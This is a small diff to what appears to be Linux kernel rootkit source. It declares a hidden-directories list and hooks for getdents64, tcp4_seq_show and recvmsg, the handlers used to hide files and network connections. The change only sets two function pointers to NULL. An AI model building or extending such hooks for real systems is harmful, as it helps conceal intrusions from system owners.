@@ -4,8 +4,8 @@ LIST_HEAD(hidden_dirs_list);
 spinlock_t hidden_dirs_lock = __SPIN_LOCK_UNLOCKED(hidden_dirs_lock);
 
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
-asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v);
-asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs);
+asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs) = NULL;
 
 asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     int ret;
